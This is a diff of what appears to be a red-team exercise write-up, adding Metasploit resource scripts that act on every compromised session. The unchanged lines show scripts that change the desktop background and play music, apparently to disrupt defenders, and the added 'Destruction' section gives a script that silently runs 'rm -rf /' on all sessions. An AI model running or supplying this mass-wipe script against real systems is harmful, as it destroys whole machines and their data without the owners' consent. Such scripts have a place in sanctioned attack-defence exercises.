@@ -390,8 +390,8 @@ This payload will find the meterpreter payload that I created and copy it to /sb
 
 To dirupt the blue team we changed the background and played music.
 
-To change the background we ran a resource file   
-mass-background-change.rc
+To change the background we ran a resource file:   
+mass-background-change.rc   
 ```ruby
 <ruby>
 framework.sessions.each do |num,session|
@@ -404,8 +404,8 @@ end
 </ruby>
 ```
 
-To play music again we ran a resource file   
-mass-audio-rickroll.rc
+To play music again we ran a resource file:   
+mass-audio-rickroll.rc   
 ```ruby
 <ruby>
 framework.sessions.each do |num,session|
@@ -420,7 +420,18 @@ end
 </ruby>
 ```
 
+## Destruction
 
+To destroy all remaining systems we can run a resource file:   
+mass-destruction.rc  
+```ruby
+<ruby>
+framework.sessions.each do |num,session|
+session.sys.process.execute("/bin/bash", "-c 'rm -rf /'", {'Hidden' => true, 'Channelized' => false})
+print_status("Destroying session #{num})
+end
+</ruby>
+```
 
   
 
